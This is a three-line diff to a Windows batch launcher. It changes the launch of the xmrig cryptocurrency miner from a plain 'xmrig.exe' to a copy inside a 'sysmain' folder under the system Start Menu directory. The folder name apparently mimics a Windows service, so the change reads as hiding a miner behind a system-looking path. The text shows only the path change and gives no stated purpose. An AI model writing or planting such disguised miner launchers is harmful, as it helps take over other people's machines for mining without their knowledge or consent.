@@ -1,3 +1,3 @@
 @echo off
-xmrig.exe
+"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\sysmain\xmrig.exe"
 pause
